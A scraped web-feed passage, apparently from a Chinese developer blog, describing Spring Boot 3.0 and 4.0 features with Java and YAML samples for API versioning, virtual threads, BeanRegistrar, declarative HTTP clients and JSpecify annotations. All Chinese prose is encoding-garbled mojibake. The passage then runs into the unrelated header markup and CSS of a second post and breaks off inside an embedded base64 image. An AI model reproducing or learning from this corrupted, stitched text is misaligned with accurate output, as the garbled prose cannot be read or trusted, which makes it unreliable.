<p><strong>æ ¸å¿ƒä¼˜åŠ¿</strong>ï¼šåº”ç”¨å¯åŠ¨é€Ÿåº¦ä»ç§’çº§é™è‡³<strong>æ¯«ç§’çº§</strong>ï¼Œå†…å­˜å ç”¨å¤§å¹…é™ä½ï¼Œéå¸¸é€‚åˆ<strong>Serverless</strong>å’Œ<strong>é«˜å¯†åº¦å®¹å™¨éƒ¨ç½²</strong>åœºæ™¯ã€‚</p>
<h3 data-id="heading-6">1.2. è¿ç§»ä¸å‡çº§æ ¸å¿ƒè¦ç‚¹</h3>
<ul>
<li><strong>é¦–è¦å‰æ</strong>ï¼šç¡®ä¿ä½ çš„JDKç‰ˆæœ¬ä¸º <strong>17</strong> æˆ–æ›´é«˜ã€‚</li>
<li><strong>æœ€ç¹ççš„æ”¹åŠ¨</strong>ï¼šå°†ä»£ç ä¸­æ‰€æœ‰<code>javax.*</code>çš„å¯¼å…¥ï¼ˆå¦‚<code>javax.servlet</code>, <code>javax.persistence</code>ï¼‰æ‰‹åŠ¨æ”¹ä¸º<code>jakarta.*</code>ã€‚è¿™æ˜¯å‡çº§è¿‡ç¨‹ä¸­æœ€å¸¸è§ã€æœ€åŸºç¡€çš„æ”¹åŠ¨ã€‚</li>
<li><strong>ä¾èµ–æ£€æŸ¥</strong>ï¼šç¡®ä¿æ‰€æœ‰ç¬¬ä¸‰æ–¹ä¾èµ–ï¼ˆå°¤å…¶æ˜¯æ•°æ®åº“é©±åŠ¨ã€å„ç§<code>starter</code>ï¼‰éƒ½å·²æä¾›ä¸Spring Boot 3.0ï¼ˆå³Jakarta EE 9+ï¼‰å…¼å®¹çš„ç‰ˆæœ¬ã€‚</li>
<li><strong>æ–°é¡¹ç›®</strong>ï¼šå¼ºçƒˆå»ºè®®ç›´æ¥åŸºäº <strong>Spring Boot 3.x</strong> å’Œ <strong>Java 17+</strong> åˆ›å»ºï¼Œä»å¼€å§‹å°±ç«™åœ¨ç°ä»£æŠ€æœ¯æ ˆä¸Šã€‚</li>
</ul>
<h3 data-id="heading-7">1.3. æ€»ç»“</h3>
<p>æ€»çš„æ¥è¯´ï¼ŒSpring Boot 3.0 æ˜¯ä¸€æ¬¡<strong>é¢å‘æœªæ¥åå¹´</strong>çš„åŸºçŸ³å‡çº§ã€‚å®ƒé€šè¿‡æ‹¥æŠ± <strong>Java 17</strong> å’Œ <strong>Jakarta EE</strong> å¥ å®šäº†ç°ä»£åŸºç¡€ï¼Œé€šè¿‡é›†æˆ <strong>GraalVM åŸç”Ÿç¼–è¯‘</strong> æä¾›äº†äº‘åŸç”Ÿçš„ç»ˆææ€§èƒ½æ–¹æ¡ˆï¼Œå¹¶é€šè¿‡<strong>å£°æ˜å¼HTTPå®¢æˆ·ç«¯</strong>ã€<strong>å¢å¼ºå¯è§‚æµ‹æ€§</strong>ç­‰ç‰¹æ€§æ˜¾è‘—æå‡äº†å¼€å‘ä½“éªŒå’Œè¿ç»´èƒ½åŠ›ã€‚</p>
<h2 data-id="heading-8">2. Spring Boot 4.0</h2>
<p>Spring Boot 4.0æ˜¯ä¸€æ¬¡é‡å¤§çš„ã€é¢å‘æœªæ¥çš„æ›´æ–°ï¼Œå®ƒåŸºäºå…¨æ–°çš„Spring Framework 7.0æ„å»ºï¼Œæ ‡å¿—ç€Springç”Ÿæ€è¿›å…¥äº†æ–°çš„ä¸€ä»£ã€‚ä¸‹è¡¨æ¦‚æ‹¬äº†å®ƒçš„æ ¸å¿ƒæ–°ç‰¹æ€§ï¼Œå¸®åŠ©ä½ å¿«é€ŸæŠŠæ¡è¦ç‚¹ï¼š</p>
<p>Spring Boot 4.0 æ ¸å¿ƒæ–°ç‰¹æ€§ä¸€è§ˆï¼š</p>

































































<table><thead><tr><th align="left">ç‰¹æ€§ç±»åˆ«</th><th align="left">æ ¸å¿ƒç‰¹æ€§</th><th align="left">ç®€è¦è¯´æ˜ä¸å½±å“</th></tr></thead><tbody><tr><td align="left"><strong>å¹³å°ä¸æ¶æ„</strong></td><td align="left"><strong>Java 17+ åŸºçº¿</strong></td><td align="left">å¼ºåˆ¶è¦æ±‚ï¼Œä»¥åˆ©ç”¨ç°ä»£Javaç‰¹æ€§ï¼ˆå¦‚è®°å½•ç±»ã€å¯†å°ç±»ï¼‰ã€‚</td></tr><tr><td align="left"/><td align="left"><strong>å…¨é¢æ”¯æŒJakarta EE 11</strong></td><td align="left">åŒ…å‘½åç©ºé—´ä» <code>javax.*</code> å½»åº•è¿ç§»è‡³ <code>jakarta.*</code>ï¼Œæ˜¯å‡çº§ä¸­æœ€å¸¸è§çš„ä»£ç ä¿®æ”¹ç‚¹ã€‚</td></tr><tr><td align="left"/><td align="left"><strong>æ¨¡å—åŒ–æ¶æ„é‡æ„</strong></td><td align="left">Spring Bootè‡ªèº«è¢«æ‹†åˆ†ä¸ºæ•°åä¸ªç‹¬ç«‹æ¨¡å—ï¼ˆå¦‚<code>spring-boot-webmvc</code>ï¼‰ï¼Œæå‡å¯ç»´æŠ¤æ€§å’Œæ„å»ºæ•ˆç‡ã€‚</td></tr><tr><td align="left"><strong>å¼€å‘æ•ˆç‡ä¸API</strong></td><td align="left"><strong>åŸç”ŸAPIç‰ˆæœ¬æ§åˆ¶</strong></td><td align="left">åœ¨ <code>@RequestMapping</code> ç­‰æ³¨è§£ä¸­ç›´æ¥ä½¿ç”¨ <code>version</code> å±æ€§ç®¡ç†å¤šç‰ˆæœ¬APIï¼Œæ— éœ€ç¬¬ä¸‰æ–¹åº“ã€‚</td></tr><tr><td align="left"/><td align="left"><strong>æ–°çš„é…ç½®æ¨¡å‹ï¼šBeanRegistrar</strong></td><td align="left">å¼•å…¥æ›´çµæ´»ã€æ›´å¼ºå¤§çš„ <code>BeanRegistrar</code> æ¥å£ï¼Œç”¨äºç¼–ç¨‹å¼ã€æ‰¹é‡æ³¨å†ŒBeanã€‚</td></tr><tr><td align="left"/><td align="left"><strong>å£°æ˜å¼HTTPå®¢æˆ·ç«¯</strong></td><td align="left">é€šè¿‡ <code>@HttpExchange</code> ç­‰æ³¨è§£å£°æ˜HTTPæœåŠ¡æ¥å£ï¼ˆåœ¨Spring Boot 3ä¸­å¼•å…¥ï¼‰ï¼Œåœ¨4.xä¸­å¾—åˆ°å·©å›ºå’Œå¢å¼ºã€‚</td></tr><tr><td align="left"/><td align="left"><strong>å¢å¼ºçš„ç©ºå®‰å…¨(Null Safety)æ”¯æŒ</strong></td><td align="left">é‡‡ç”¨ <strong>JSpecify</strong> æ³¨è§£ï¼ˆå¦‚ <code>@NonNull</code>, <code>@Nullable</code>ï¼‰ï¼Œæä¾›è·¨å·¥å…·çš„æ ‡å‡†ç©ºå®‰å…¨å¥‘çº¦ï¼Œå‡å°‘ç©ºæŒ‡é’ˆå¼‚å¸¸ã€‚</td></tr><tr><td align="left"><strong>äº‘åŸç”Ÿä¸æ€§èƒ½</strong></td><td align="left"><strong>ç”Ÿäº§çº§GraalVMåŸç”Ÿé•œåƒæ”¯æŒ</strong></td><td align="left">å°†AOTç¼–è¯‘å’ŒåŸç”Ÿé•œåƒæ”¯æŒä»å®éªŒç‰¹æ€§å‡çº§ä¸ºç”Ÿäº§å°±ç»ªï¼Œå®ç°<strong>æ¯«ç§’çº§å¯åŠ¨</strong>å’Œ<strong>å¤§å¹…é™ä½å†…å­˜å ç”¨</strong>ã€‚</td></tr><tr><td align="left"/><td align="left"><strong>ä¼˜åŒ–çš„é«˜å¹¶å‘æ”¯æŒ</strong></td><td align="left">æ·±åº¦é›†æˆå¹¶ä¼˜åŒ–äº†å¯¹<strong>è™šæ‹Ÿçº¿ç¨‹ï¼ˆVirtual Threadsï¼‰</strong> çš„æ”¯æŒï¼Œç»“åˆå£°æ˜å¼HTTPå®¢æˆ·ç«¯ï¼Œç®€åŒ–é«˜å¹¶å‘åº”ç”¨çš„å¼€å‘ã€‚</td></tr><tr><td align="left"/><td align="left"><strong>Consolidated Spring Securityæ”¯æŒ</strong></td><td align="left">æ•´åˆäº†Spring Securityçš„æ”¯æŒï¼Œå°†Kerberoså’Œç‹¬ç«‹çš„æˆæƒæœåŠ¡å™¨ç­‰ç‰¹æ€§çº³å…¥Spring Security 7ä¸»çº¿ã€‚</td></tr><tr><td align="left"/><td align="left"><strong>Spring Batchæ”¹è¿›</strong></td><td align="left">æä¾›äº†æ–°çš„æ— èµ„æºï¼ˆresourcelessï¼‰å’ŒåŸºäºMongoDBçš„ä»“åº“å®ç°ã€‚</td></tr></tbody></table>
<blockquote>
<p>æ³¨ï¼šå…³äº<strong>è™šæ‹Ÿçº¿ç¨‹</strong>ï¼Œéœ€ç‰¹åˆ«è¯´æ˜ï¼šè™½ç„¶è®¸å¤šå¼€å‘è€…ç¤¾åŒºæ–‡ç« å°†å…¶åˆ—ä¸ºSpring Boot 4çš„æ ¸å¿ƒç‰¹æ€§ï¼Œä½†æœ€æƒå¨çš„Springå®˜æ–¹æ€»ç»“ä¸­å¹¶æœªæ˜ç¡®å°†å…¶ä½œä¸ºSpring Boot 4çš„å†…ç½®é»˜è®¤ç‰¹æ€§é‡ç‚¹åˆ—å‡ºã€‚æ›´å‡†ç¡®çš„ç†è§£æ˜¯ï¼ŒSpring Boot 4è¿è¡Œåœ¨Java 21+ä¹‹ä¸Šï¼Œå¯ä»¥<strong>å®Œç¾æ”¯æŒå’Œåˆ©ç”¨è™šæ‹Ÿçº¿ç¨‹</strong>ï¼Œå¹¶å¯èƒ½æä¾›äº†ä¸€äº›é…ç½®ä¼˜åŒ–ï¼Œä½†å…¶æœ¬èº«å¹¶éä¸€ä¸ªå…¨æ–°çš„ã€Spring Boot 4ç‹¬å çš„å†…ç½®åŠŸèƒ½ã€‚</p>
</blockquote>
<h3 data-id="heading-9">2.1. æ ¸å¿ƒç‰¹æ€§è¯¦è§£ä¸ç¤ºä¾‹</h3>
<p>ä¸‹é¢ç”¨å…·ä½“ä»£ç å±•ç¤ºå‡ ä¸ªå…³é”®ç‰¹æ€§çš„ç”¨æ³•ã€‚</p>
<h4 data-id="heading-10">2.1.1. åŸç”ŸAPIç‰ˆæœ¬æ§åˆ¶</h4>
<p>ç°åœ¨å¯ä»¥åœ¨åŒä¸€ä¸ªURLä¸Šï¼Œé€šè¿‡æ³¨è§£ç›´æ¥å®šä¹‰å¤šä¸ªç‰ˆæœ¬çš„å¤„ç†æ–¹æ³•ã€‚</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@RestController</span>
<span class="hljs-meta">@RequestMapping("/api/user")</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">UserController</span> {
    <span class="hljs-meta">@GetMapping(version = "1")</span>
    <span class="hljs-keyword">public</span> UserV1 <span class="hljs-title function_">getUserV1</span><span class="hljs-params">()</span> {
        <span class="hljs-comment">// è¿”å›æ—§ç‰ˆæ•°æ®æ¨¡å‹</span>
        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UserV1</span>(<span class="hljs-string">"å¼ ä¸‰"</span>);
    }
    <span class="hljs-meta">@GetMapping(version = "2")</span>
    <span class="hljs-keyword">public</span> UserV2 <span class="hljs-title function_">getUserV2</span><span class="hljs-params">()</span> {
        <span class="hljs-comment">// è¿”å›æ–°ç‰ˆæ•°æ®æ¨¡å‹ï¼ŒåŒ…å«æ›´å¤šå­—æ®µ</span>
        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UserV2</span>(<span class="hljs-string">"å¼ ä¸‰"</span>, <span class="hljs-string">"zhangsan@example.com"</span>);
    }
}
</code></pre>
<p>è°ƒç”¨æ—¶ï¼Œå®¢æˆ·ç«¯é€šè¿‡åœ¨HTTPè¯·æ±‚å¤´ä¸­æŒ‡å®š<code>Version: 1</code>æˆ–<code>Version: 2</code>æ¥é€‰æ‹©ä¸åŒç‰ˆæœ¬çš„APIã€‚è¿™æå¤§åœ°ç®€åŒ–äº†APIæ¼”è¿›çš„ç»´æŠ¤å·¥ä½œã€‚</p>
<h4 data-id="heading-11">2.1.2. è™šæ‹Ÿçº¿ç¨‹æ”¯æŒ</h4>
<p>å¦‚æœåº”ç”¨è¿è¡Œåœ¨Java 21+ä¸Šï¼Œå¯ä»¥è½»æ¾å¯ç”¨è™šæ‹Ÿçº¿ç¨‹æ¥å¤„ç†é«˜å¹¶å‘ã€‚</p>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-comment"># application.yml</span>
<span class="hljs-attr">spring:</span>
  <span class="hljs-attr">threads:</span>
    <span class="hljs-attr">virtual:</span>
      <span class="hljs-attr">enabled:</span> <span class="hljs-literal">true</span>  <span class="hljs-comment"># å…¨å±€å¯ç”¨è™šæ‹Ÿçº¿ç¨‹æ”¯æŒ</span>
</code></pre>
<p>å¯ç”¨åï¼Œ<code>@Async</code>å¼‚æ­¥ä»»åŠ¡ã€Web MVCè¯·æ±‚å¤„ç†ç­‰å°†ä¼šè‡ªåŠ¨ä½¿ç”¨è™šæ‹Ÿçº¿ç¨‹ï¼Œå¯ä»¥<strong>ç”¨æ›´å°‘çš„èµ„æºæ”¯æ’‘æ›´é«˜çš„å¹¶å‘</strong>ã€‚ä¸ä¼ ç»Ÿçº¿ç¨‹æ± ç›¸æ¯”ï¼Œä¸å†éœ€è¦ä¸ºçº¿ç¨‹æ•°é‡è°ƒä¼˜è€Œçƒ¦æ¼ã€‚</p>
<h4 data-id="heading-12">2.1.3. æ–°çš„BeanRegistraré…ç½®æ¨¡å‹</h4>
<p><code>BeanRegistrar</code>æä¾›äº†æ¯”ä¼ ç»Ÿ<code>@Bean</code>æ³¨è§£æ›´çµæ´»ã€æ›´å¼ºå¤§çš„Beanæ³¨å†Œæ–¹å¼ï¼Œç‰¹åˆ«é€‚åˆéœ€è¦æ ¹æ®å¤æ‚æ¡ä»¶æ‰¹é‡æ³¨å†ŒBeançš„åœºæ™¯ã€‚</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">import</span> org.springframework.beans.factory.BeanRegistrar;
<span class="hljs-keyword">import</span> org.springframework.beans.factory.BeanRegistry;
<span class="hljs-keyword">import</span> org.springframework.core.env.Environment;

<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MyModuleRegistrar</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">BeanRegistrar</span> {
    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">register</span><span class="hljs-params">(BeanRegistry registry, Environment environment)</span> {
        <span class="hljs-comment">// æ‰¹é‡æ³¨å†Œä¸€æ‰¹ç›¸å…³çš„Bean</span>
        registry.registerBean(<span class="hljs-string">"serviceA"</span>, MyServiceA.class);
        registry.registerBean(<span class="hljs-string">"serviceB"</span>, MyServiceB.class);
        <span class="hljs-comment">// æ ¹æ®ç¯å¢ƒå±æ€§åŠ¨æ€æ³¨å†ŒBean</span>
        <span class="hljs-keyword">if</span> (environment.matchesProfiles(<span class="hljs-string">"cluster"</span>)) {
            registry.registerBean(<span class="hljs-string">"clusterService"</span>, ClusterService.class);
        }
    }
}
</code></pre>
<p>ç„¶ååœ¨é…ç½®ç±»ä¸­é€šè¿‡<code>@Import</code>å¯¼å…¥å³å¯ã€‚è¿™ä½¿å¾—å¤§å‹åº”ç”¨çš„æ¨¡å—åŒ–ç»„ç»‡æ›´åŠ æ¸…æ™°ã€‚</p>
<h4 data-id="heading-13">2.1.4. å£°æ˜å¼HTTPå®¢æˆ·ç«¯ (å·©å›ºå¢å¼º)</h4>
<p>åœ¨Spring Boot 3ä¸­å¼•å…¥çš„å£°æ˜å¼HTTPå®¢æˆ·ç«¯ï¼ˆ<code>@HttpExchange</code>ï¼‰å·²æˆä¸ºæœåŠ¡é—´è°ƒç”¨çš„é¦–é€‰æ–¹å¼ï¼Œåœ¨Spring Boot 4ä¸­æ›´ä¸ºæˆç†Ÿã€‚</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// 1. å£°æ˜æ¥å£</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">UserServiceClient</span> {
    <span class="hljs-meta">@GetExchange("/users/{id}")</span>
    User <span class="hljs-title function_">getUserById</span><span class="hljs-params">(<span class="hljs-meta">@PathVariable</span> Long id)</span>;
}
<span class="hljs-comment">// 2. åˆ›å»ºä»£ç†å¹¶æ³¨å…¥</span>
<span class="hljs-meta">@Service</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">OrderService</span> {
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> UserServiceClient userServiceClient;
    <span class="hljs-keyword">public</span> <span class="hljs-title function_">OrderService</span><span class="hljs-params">(UserServiceClient userServiceClient)</span> {
        <span class="hljs-built_in">this</span>.userServiceClient = userServiceClient; <span class="hljs-comment">// åƒä½¿ç”¨æœ¬åœ°Beanä¸€æ ·è°ƒç”¨</span>
    }
}
</code></pre>
<h4 data-id="heading-14">2.1.5. å¢å¼ºçš„ç©ºå®‰å…¨(Null Safety)æ”¯æŒ</h4>
<p>Spring Boot 4è½¬å‘é‡‡ç”¨è¡Œä¸šæ ‡å‡†<strong>JSpecify</strong>æ³¨è§£ï¼Œæä¾›ç»Ÿä¸€çš„ç©ºå®‰å…¨çº¦æŸã€‚</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">import</span> org.jspecify.annotations.NonNull;
<span class="hljs-keyword">import</span> org.jspecify.annotations.Nullable;

<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">UserService</span> {
    <span class="hljs-comment">// å‚æ•°nameæ˜ç¡®æ ‡è®°ä¸ºå¯ç©ºï¼Œè¿”å›å€¼æ˜ç¡®æ ‡è®°ä¸ºéç©º</span>
    <span class="hljs-keyword">public</span> <span class="hljs-meta">@NonNull</span> User <span class="hljs-title function_">createUser</span><span class="hljs-params">(<span class="hljs-meta">@Nullable</span> String name)</span> {
        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">User</span>(name != <span class="hljs-literal">null</span> ? name : <span class="hljs-string">"Guest"</span>);
    }
}
</code></pre>
<p>é…åˆIDEï¼ˆå¦‚IntelliJ IDEA 2024+ï¼‰ï¼Œè¿™äº›æ³¨è§£èƒ½åœ¨ç¼–è¯‘æœŸæä¾›è­¦å‘Šï¼Œæå¤§æå‡ä»£ç å¥å£®æ€§ã€‚</p>
<h3 data-id="heading-15">2.2. å‡çº§å»ºè®®ä¸æ€»ç»“</h3>
<p>Spring Boot 4æ˜¯ä¸€æ¬¡<strong>é¢å‘äº‘åŸç”Ÿå’Œä¸‹ä¸€ä»£Javaåº”ç”¨</strong>çš„åŸºçŸ³å‡çº§ã€‚å®ƒé€šè¿‡å¼ºåˆ¶æ‹¥æŠ± <strong>Java 17+</strong> å’Œ <strong>Jakarta EE 11</strong> å¥ å®šäº†ç°ä»£åŒ–åŸºç¡€ï¼Œå¹¶é€šè¿‡<strong>åŸç”Ÿé•œåƒ</strong>ã€<strong>è™šæ‹Ÿçº¿ç¨‹æ”¯æŒ</strong>å’Œ<strong>æ›´ä¼˜é›…çš„APIè®¾è®¡</strong>ï¼ˆå¦‚ç‰ˆæœ¬æ§åˆ¶ã€å£°æ˜å¼å®¢æˆ·ç«¯ï¼‰å¤§å¹…æå‡äº†å¼€å‘ä½“éªŒå’Œè¿è¡Œæ—¶æ•ˆèƒ½ã€‚</p>
<p><strong>å»ºè®®ï¼š</strong></p>
<ul>
<li><strong>æ–°é¡¹ç›®</strong>ï¼šå¦‚æœä»é›¶å¼€å§‹ï¼Œå¹¶ä¸”å›¢é˜ŸæŠ€æœ¯æ ˆå…è®¸ï¼ˆä½¿ç”¨Java 17+ï¼‰ï¼Œå¼ºçƒˆå»ºè®®ç›´æ¥åŸºäº <strong>Spring Boot 4</strong> åˆ›å»ºã€‚</li>
<li><strong>ç°æœ‰Spring Boot 3é¡¹ç›®</strong>ï¼šå¯ä»¥è¯„ä¼°å‡çº§æ”¶ç›Šï¼Œå¦‚å¯¹å¯åŠ¨é€Ÿåº¦ã€å†…å­˜å ç”¨æœ‰æè‡´è¦æ±‚ï¼ˆäº‘åŸç”Ÿï¼‰ï¼Œæˆ–éœ€ä½¿ç”¨åŸç”ŸAPIç‰ˆæœ¬æ§åˆ¶ç­‰æ–°ç‰¹æ€§ï¼Œåˆ™å¯è§„åˆ’å‡çº§ã€‚æ³¨æ„æå‰å¤„ç†<code>javax</code>åˆ°<code>jakarta</code>çš„åŒ…åå˜æ›´ã€‚</li>
<li><strong>ç°æœ‰Spring Boot 2.xæˆ–æ›´æ—©é¡¹ç›®</strong>ï¼šä¸å»ºè®®ç›´æ¥è·³å‡åˆ°4.0ã€‚åº”å…ˆæŒ‰ <strong>2.x -&gt; 3.x -&gt; 4.x</strong> çš„è·¯å¾„é€æ­¥å‡çº§ï¼Œæ¯æ¬¡å¤„ç†ä¸€ä¸ªä¸»è¦ç‰ˆæœ¬çš„ç ´åæ€§å˜æ›´ã€‚</li>
</ul></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[ä»â€œAgent å…ƒå¹´â€åˆ° AI IDE å…ƒå¹´â€”â€”2025 æˆ‘ä¸ Vibe Coding çš„é‚£äº›äº‹å„¿]]></title>    <link>https://juejin.cn/post/7590011643297153062</link>    <guid>https://juejin.cn/post/7590011643297153062</guid>    <pubDate>2026-01-02T11:33:26.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7590011643297153062" data-draft-id="7589942565012078618" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="ä»â€œAgent å…ƒå¹´â€åˆ° AI IDE å…ƒå¹´â€”â€”2025 æˆ‘ä¸ Vibe Coding çš„é‚£äº›äº‹å„¿"/> <meta itemprop="keywords" content="åç«¯,ç¨‹åºå‘˜"/> <meta itemprop="datePublished" content="2026-01-02T11:33:26.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="åŠªåŠ›çš„å°é›¨"/> <meta itemprop="url" content="https://juejin.cn/user/572218015747543"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            ä»â€œAgent å…ƒå¹´â€åˆ° AI IDE å…ƒå¹´â€”â€”2025 æˆ‘ä¸ Vibe Coding çš„é‚£äº›äº‹å„¿
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/572218015747543/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    åŠªåŠ›çš„å°é›¨
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-02T11:33:26.000Z" title="Fri Jan 02 2026 11:33:26 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-02
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»9åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>@charset "UTF-8";.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:15px;overflow-x:hidden;color:#2b2b2b;font-family:-apple-system,system-ui,BlinkMacSystemFont,Helvetica Neue,PingFang SC,Hiragino Sans GB,Microsoft YaHei,Arial,sans-serif;background-image:linear-gradient(90deg,rgba(159,219,252,.15) 3%,transparent 0),linear-gradient(1turn,rgba(159,219,252,.15) 3%,transparent 0);background-size:20px 20px;background-position:50%}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{padding:30px 0;margin-top:35px;margin-bottom:10px;color:#4dd0e1}.markdown-body h1{font-size:30px;text-align:center;position:relative;width:max-content;margin:0 auto}.markdown-body h1:before{position:absolute;content:"";z-index:-1;top:-20px;height:100%;width:100px;left:0;right:0;margin:0 auto;background:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAADsAAAA6CAYAAAAOeSEWAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAABkLSURBVGhDtZoHnJ1llcbP3Om9ZiYzmfSQhCQQIbRQVQKI9CYC68qKriJK0UXcZRcINqStIoiIqKCi1NACQihBWiCkkJ5MJlMyvd7p7d759v989/sy34yTbIj48Atz71ff855znvOc971xDrB/EtoGI7a9Z8Aq+wZML0mNj7dE95NZ1OKsj1dHo1GbnJpss9OTbWJyonvun4VP1Njuoagtb+m0it4By0iIt8LEeMvkr8XFWcfgkA1gYDLf47i2PzpsyU7UspKSLDoctagTZ7Vc08MzClMS7awJ2ZaflBB78CeET8TYla1dtrKt2w5KS7YCDGzEoz2RqKUmhGw6x2bhuXyOp2BoRXef1Q1E7Lj8TIsMD1sbxu1kcnYSAX1810RMTUmyMB7f2j1gC7NS7byinNiL/kH8Q8a+2NRh77b32El56VaPAe0YeGR2mh2bm+FdMRqP1rbZe+3dFsHT35qcb/Oz0rwzo7Gxs9feYPLS4kM2h8lawee5hPmlJXneFQeGAzJ2F564v7rFzi7Msu3d/Xgjzq5g8ArX8VCNN2vJ28daey0zZJabmGCLslP5HOf+Oygr3UzDGOf+JxrauXfQjslJt+dbuuyMgiwmk+sPAB/b2Lt2NdoMZnuY21qHIvbvUyZ4Z0ZQiXGrWjvsmPxsK4R0nmHA8ZCTQvxVQn5eRipklIBtcVbV1WtHYsjati47ZWKuTUpP9Z4yGk/xDBGe3v1mW4/dOrvYO7P/2G9jRSjf31FnXyaUXiB8r51WaJkM3kcfOSa2FR6qarIenooTLQHPLcC4mYThyw1tVpKWYlVERlZ8nC3Oz3Jzdn1nn5uvQ8OOHYvhR/CvsqffJbkCkZTvcYZ6Z0WTfTovw5Y1dtjXp+TbFPhgf7FfxpYxuMfr2uwo8rEtMmwXF+d6Z8wGmIR2PLyjo8cqOFffP2SLGexJEJCP9R29thkPXlpa4A5Y3w/jmuVNYYwO2QkY7WMtz3mVcE1hkualJdmSolzX8GnpKd4VZq80d1o7zN0RdWxGaqItgbn3B/+vsasgh/UMNBOvzYMZDxtDKp289KGaVguFQvb1yQWWwuB97GaSXqUUnVaYbSUwrDCEBz/C2CM8EhNrP13fbkeSh3OJgCAe2N1CWXKsGOc6TOr5U4q8MwYhDtkTda02MyPN+nnGBQEH7A37NHYz5KOZVv08qyjbSseEzKauPnsMj98wc6Ibcj5UUv7M8QWZTE52jEwGOVaD8U1Dw1YNWX0qM8VKyb80L/TrOPYOzH4KBJQTrK8M7+7KZjuM63sHBt17FubGoibCuf+tarWFGUmuwWeT8/vCXo1tZOYeZcazCaez8MwEzzM+HqhqtiJI5twxL1jeGLYk7jmKMF1JOCbg6Qj5nAdRqX7q3BYm8VAmQvW1lfcMc58IT95uIA3q+gftrDHPXUXJWkVEHJme5Bp5UmHsvIZ/O3l8ECE/FWcsItX2hr0ae8O2Wjs+J43QTbOZzGYQ/7Wtxq6eXjRK3r0By4YJ6Ty8EiYSJqcm2eGeV4Pox/ANENJR49RiEdfqcLflUJrEBZqgxYHrBjn2ExFURqKdVETN9YirJxKxR2rbrYeQv5ISmB6IsiDGNfZGWPeMgkzr58xnPaJ5p6XDZPKz4T77wayJ7jGhhXLwanOHTWBgq5n5q6YUwNJ7l3kKcRl7OJ7fF56l1GzvHbSD8dghTPi0wIRfv6XafjJ3ssv0PnZQ7nZx/etwzO1zJ3lHR2OETTw8x0t